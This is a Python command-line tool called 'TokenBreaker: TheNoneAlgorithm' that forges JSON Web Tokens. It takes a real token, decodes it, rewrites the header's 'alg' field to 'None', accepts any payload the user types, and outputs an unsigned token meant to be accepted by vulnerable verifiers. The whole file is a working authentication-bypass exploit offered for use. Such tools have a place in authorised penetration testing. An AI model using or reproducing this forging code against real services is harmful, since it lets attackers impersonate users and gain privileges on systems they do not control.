#!/usr/bin/env python3
# -*- coding: utf-8 -*-


from stoyled import *
from argparse import ArgumentParser
from base64 import b64decode, b64encode
from re import sub as reSubst


def banner():
    logo = '\033[1m ________         _  __\n/_  __/ /  ___   / |/ /__  ___  __'
    logo += '_\n / / / _ \\/ -_) /    / _ \\/ _ \\/ -_)\n/_/ /_//_/\\__/ /_/|_'
    logo += '/\\___/_//_/\\__/\n\033[0m'
    print(logo)


def verify_Padding(data):
    missing_padding = len(data) % 4
    if missing_padding != 0:
        data += '=' * (4 - missing_padding)
    return data


def processTheNoneToken(token):
    header = b64decode(verify_Padding(token.split('.')[0]))
    payload = b64decode(verify_Padding(token.split('.')[1]))
    print(info("Decoded Header value -> {}".format(header.decode())))
    print(info("Decoded Payload value -> {}".format(payload.decode())))
    header = reSubst(b'"alg":".{5}"', b'"alg":"None"', header)
    print(info("New header with 'alg' > 'none' -> {}".format(header.decode())))

    modify_response = coolInput("Modify Header? [y/N]")
    if modify_response.lower() == 'y':
        header = coolInput("Enter your header with 'alg' field set to 'None'")
        header = header.encode()
        print(info("Header set to -> " + header.decode()))
    payload = coolInput("Enter your payload")
    base64header = b64encode(header).rstrip(b'=')
    base64payload = b64encode(payload.encode()).rstrip(b'=')
    finaljwt = base64header + b'.' + base64payload + b"."
    print(good("Successfully encoded Token -> {}".format(finaljwt.decode())))


def main():
    parser = ArgumentParser(
        description='TokenBreaker: 1.TheNoneAlgorithm',
        epilog='Example Usage: \npython TheNone.py -t [JWTtoken]\n'
        )
    requiredparser = parser.add_argument_group('required arguments')
    requiredparser.add_argument('-t', '--token', help="JWT Token value",
                                required=True)
    args = parser.parse_args()
    banner()
    processTheNoneToken(args.token)


if __name__ == '__main__':
    main()
